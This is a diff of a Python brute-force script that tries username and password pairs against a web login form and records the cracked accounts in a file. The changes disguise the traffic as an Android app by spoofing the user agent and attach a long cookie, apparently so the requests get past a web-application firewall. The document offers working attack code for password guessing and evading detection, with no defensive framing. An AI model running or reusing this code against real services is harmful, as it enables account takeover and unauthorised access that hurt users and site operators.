@@ -6,22 +6,23 @@ import time
 outFile = open('accounts-cracked.txt', 'w')
 def brute_force(user, password):
     domain = "appserver.me:5001"
-    domain = "appserver.me:80"
+    #domain = "appserver.me:80"
     name = user.strip()
     passwd = password.strip()
     proxy = {"http":"127.0.0.1:8080"}
     url = "http://"+domain+"/login/"
     CT = "application/x-www-form-urlencoded"
     user_agent = "MacOS; Python3.6; requests)"
+    user_agent = "Dalvik/2.1.0 (Linux; U; Android 8.1.1; Redmi 8 MIUI/8.4.26)"
     AE = "gzip, deflate"
-    appcookie = "BjplLUIONFs1KteXW9DZDU8lWrhi3wqvSyXoUNYo9XRSLhDb8FGChywp78WDSO3Nf2tTARohPSAmskgUIreF5s14zB26wOuk3cY-mK3VnnWlLqOH-k-Oak8HFeHx8wy0QfDP_c0m80giM0_-WeoRR_WbPW_ukpXnnFIHPpSUHAZECH77Bo86G_Ycj8J..FNGmgF9stidKmf2kYicPA4taTiqHQ9Z45aiCxsjVn-KVN1ysvAKwG3UkijYkIrVDuWMHsjSsPvlAtccvtbTjX-Gvx16ojwpG8zoKrO2jHYPuz5V1R0fS8Ki6QKPhv_sk-iqiA5lcmiNXX_akIuUnZQvhYz4eGC90h1x187jLXH_wuIV1PPRL-bHprZnWlOQer2PrimNRZZqoXmq_2SagCswTtkfCGWLvZBT344AjpzSlw5zP_WDXnO8rkKaoCwtwwTcByfvAt7uOQv_OdVjJ1PgmrVsKv8H3SNN5qyc4hYFyb51oJU_U6oD42XWYkxdzE7L36j1OZfimr-H5H_jjcUf8jAsyKuSw6wmvjYjpV5jok_GYAy4e-aBE7SKuI7p_wtxieYFrZl6ig9flL_N7zCquz19luX60xiiGjjONso70J_wheHePkRLi6bxnzF3M4e-7YmnNW5Gu8937fHC83B2R5uttMjQR4dlRYc_yYs2u3qV2dO6-yqsrikGHihOMzHhx5qT_QFNSx.871J9N4O"
+    appcookie = "Bq9cFuKPRCG0btZxxECbvjMLJmQn1MsX8FPu46iRUdRcJMoihUj7LUJXerp5DrA-1A4uStmXeHqzigxrYAu6Z94fWqig2s8RWEgF5E9mRkAKDQG93HELqh1qIught4dH3Fx6tqjfc7EspkAkuoIkTjHHMXl-FkM6aso7BoKTg2uwRFlrbOEzL5M8gvjlPMgBBSYp3PsGO-5J7n6bZCNueapd1K5wpjRn5Pqa74PK6Af-gJ62HM_nxG0_6mwaXwuuqU9XmSKgOzjLdiJDH9C-1ivHS69W3a0btBP727vZlX1HRTB4O94ivkYeJlnJHDit1lZfQ6OJfl9k8u_V5KkThISQSOG..MXJfQ1hQjLhgYoRzF_k56qnOtbJeaC1YTE9KHD_aAJbLIvnJ9BWB5bNhkYX0G7GT6T1IA4EjAXHmLIVzOa1hQsubw_EaKQOc80Pelln0gsfs538HvwAzaFFC9zO8Rul-lkwuZkIx06fMcXOjWv2_jpoiTQUczAFBwolR-Ch316mQiqcEt_UBHr_CVtfJB7cyRN-0ISeoI_mtlemGPJHPBq0uAnV2STrL_xKIpeA_NVJ84zV5r_0jNI_c0UKEWT0ixQUwNKaEIpT0YNneWEupM-lYg-__wO22_tADPiuibfN_XmXSUkc-HNKktHAKdtyx0RojEBIDoLps-P5nA9XjQH321d9uft5dvolnv0TS0XCN0MVUtSTmhIfXI6CyB_b7H8MYikwh3potJwzQrNJ-fUHFB2iLrMzrLtJk8o1LzPv9dOO-X2OHRaYM40vn7G8WOOqKIOrnLI247XmaHTLIfzB75styqtZ3Je1Bgw1IEmcuuZdpnAYgKoxLTm4d3oHevaqDb2hLaqz7GgHDUWG482tsDY9KIoWJLI_r-7PVmIQbOZWJaC0d65wQpN4JJRe-if4jD3lI1bY7KOAGjw-kKacrxTxGpZ9FyyNn1nY1oigIDrtPRLG7vSsbrkwRKkHzavtM2x_7CuatBZMfVyDdQbcYV88sRg1qi_ZMDKhOWUPinzGhn3wS45xLs6fX2rVF5S4-c3BVFz0UZR0zts82_4TQ_GfXEvJDfTuX5202yNeaI0ou7uUlQFIaS2uifLjL-NMVq1ldB20qO8uEtE3HiN1oT2GPwGS_WOirP7MFmatxMoKXW9D2wsAhG7zec5P5nUETL-CD3XGqEK-b-3BUCiaJapXREmH482crnY5oV8alNX0aUYa08unf-l379DA2_ZJUAbnUBkMObMlnNt05NDymJBgZzZkQVGHrkdmG54SeNhRF0UZp4GmAair0vgB7JapyQ2hjXzOG..R56793S9"
     header = {"Content-Type":CT,"User-Agent":user_agent,"Accept-Encoding":AE}
     header_appcookie = dict({"wfaCdxkF":appcookie}, **header)
     #print(header_appcookie)
     data = name + '&' + passwd
     data = "uid=" + name + '&' + "passw=" + passwd
     #print("try data:",data)
-    response = requests.post(url,headers=header,data=data,allow_redirects=False,proxies=proxy)
+    response = requests.post(url,headers=header_appcookie,data=data,allow_redirects=False,proxies=proxy)
     code = response.headers.get('Location')
     #print(name,passwd)
     #print(response.text)
